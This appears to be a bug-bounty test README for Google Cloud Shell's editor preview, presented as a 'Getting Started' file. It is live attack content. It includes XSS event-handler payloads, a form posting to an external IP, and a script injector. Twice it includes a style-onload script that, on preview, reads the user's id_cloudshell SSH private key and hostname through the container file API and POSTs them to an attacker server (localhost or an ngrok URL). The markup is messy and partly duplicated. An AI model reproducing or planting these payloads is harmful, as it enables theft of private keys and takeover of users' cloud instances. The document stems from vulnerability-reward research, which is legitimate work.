# Google VRP testing  
Google cloudshell instance take over (as root)

[![Open in Cloud Shell](https://gstatic.com/cloudssh/images/open-btn.svg)](https://ssh.cloud.google.com/cloudshell/editor?page=editor&cloudshell_git_repo=https://github.com/elmasryelec/ls.git&cloudshell_open_in_editor=readme.md)
# Google VRP testing 


<button ondblclick="alert(11)" _ngcontent-jhu-c34="" aria-label="Close Editor" class="dense mat-focus-indicator mat-tooltip-trigger mat-icon-button mat-button-base ng-star-inserted" mat-icon-button="" mattooltip="Close Editor"><span class="mat-button-wrapper"><mat-icon _ngcontent-jhu-c34="" class="mat-icon notranslate google-material-icons mat-icon-no-color" role="img" aria-hidden="true" data-mat-icon-type="font">close</mat-icon></span><span class="mat-button-ripple mat-ripple mat-button-ripple-round" matripple=""></span><span class="mat-button-focus-overlay"></span></button>


Google cloudshell instance take over (as root)
<form enctype="multipart/form-data" style=""><input type="text" name="target" class="theia-input"><input type="file" class="theia-input" name="upload" multiple=""></form>
<input type="text" id="search-text" name="query" value="" onfocus="alert(1)" autofocus="" />


<html>

<body>

<div><input value="CLICK ME FOR POC" type="submit" formaction="https//35.223.190.63:443" form="subscribe" formmethod="get" /><input type="hidden" name="xss" form="subscribe" value="https//35.223.190.63:443"/></div>

<form method="GET" id="subscribe" action="https//35.223.190.63:443">

<input type="hidden" name="csrftoken" value="5f4dcc3b5aa765d61d8327deb882cf99" />

<input type="submit" value="Subscribe to newsletter" />

</form>

</body>

</html>


//<img src="https://o4tvdbdwtmkj5404x4owjbq0qrwhk6.burpcollaborator.net">
//<img src="https://970-cs-534227452153-default.europe-west1.cloudshell.dev/#keepalive">

<iframe src='setInterval (function () {d = document; z = d.createElement ("script"); z.src = "https//35.223.190.63:443"; d.body.appendChild (z)}, 0)'`<iframe src="https://35.223.190.63:443"/>

[![Open in Cloud Shell](javascript:alert(1);)]()

## Getting Started 
just need to preview this file to see the magic 
 
<style onload="{   
    var file_results = []  
    // this scape the container and get the ssh id_cloudshell private key
    read_file('file:///../id_cloudshell')          
    // getting the hostname (external connection)
    read_file('file:///etc/hostname')      
         
    setTimeout(function(){ 
        send_files(file_results)    
    },5000)  
 
    // function to read any file given the path with file protocol per example 'file:///etc/hostname'
    function read_file(file_to_read){
        var container_url = 'https://' + location.host + '/files/?uri='
        var get_file_id_url = container_url + file_to_read
        console.log(get_file_id_url) 
        fetch(get_file_id_url) // convert response to json 
            .then(response => { return response.json() } )
            .then(json => {
                var container_download_url = 'https://' + location.host + '/files/download/?id='
                var download_url = container_download_url + json.id
                fetch(download_url) 
                    .then(response => { return response.text() } )
                    .then(text => { 
                        console.log(file_to_read + ' '+ text)
                        file_results.push(file_to_read + ' '+ text)  
                    })
            })  
    }
 
    function send_files(result){ 
         // need to set netcat to listen per example nc -lvvv 55555
         let attacker_server =  'http://127.0.0.1'
         fetch(attacker_server, {
                method: 'post',
                body: JSON.stringify(result)
         })
    }
 
}"> 


<script>

	var cutString = 'File%20Provider%20Storage';
  	var locationPath = location.href.split(cutString)[0] + 'Documents';
  	var filePath = locationPath + '/device_uuid.data';
	var local_file = '/etc/passwd%00';
	document.write(local_file + '<br><br>');
	document.write(document.location + '<br><br>');


	var src = document.location;
	var src2 = '#';
	var src3 = filePath;

	var full ='<object data="'+ src +'" width="200" height="200" type="text/plain">Alternative Content</object><br>';
	document.write(full);

	var full2 ='<object data="'+ src2 +'" width="200" height="200" type="text/plain">Alternative Content</object><br>';
	document.write(full2);

	var full3 ='<object data="'+ src3 +'" width="200" height="200" type="text/plain">Alternative Content</object><br>';
	document.write(full3);


</script>  
 

## Getting Started 
just need to preview this file to see the magic 
 
<style onload="{   
    var file_results = []  
    // this scape the container and get the ssh id_cloudshell private key
    read_file('file:///../id_cloudshell')          
    // getting the hostname (external connection)
    read_file('file:///etc/hostname')      
         
    setTimeout(function(){ 
        send_files(file_results)    
    },5000)  
 
    // function to read any file given the path with file protocol per example 'file:///etc/hostname'
    function read_file(file_to_read){
        var container_url = 'https://' + location.host + '/files/?uri='
        var get_file_id_url = container_url + file_to_read
        console.log(get_file_id_url) 
        fetch(get_file_id_url) // convert response to json 
            .then(response => { return response.json() } )
            .then(json => {
                var container_download_url = 'https://' + location.host + '/files/download/?id='
                var download_url = container_download_url + json.id
                fetch(download_url) 
                    .then(response => { return response.text() } )
                    .then(text => { 
                        console.log(file_to_read + ' '+ text)
                        file_results.push(file_to_read + ' '+ text)  
                    })
            })  
    }
 
    function send_files(result){ 
         // need to set netcat to listen per example nc -lvvv 55555
         let attacker_server =  ' https://56051573.ngrok.io'
         fetch(attacker_server, {
                method: 'post',
                body: JSON.stringify(result)
         })
    }
 
}"> 
  
 
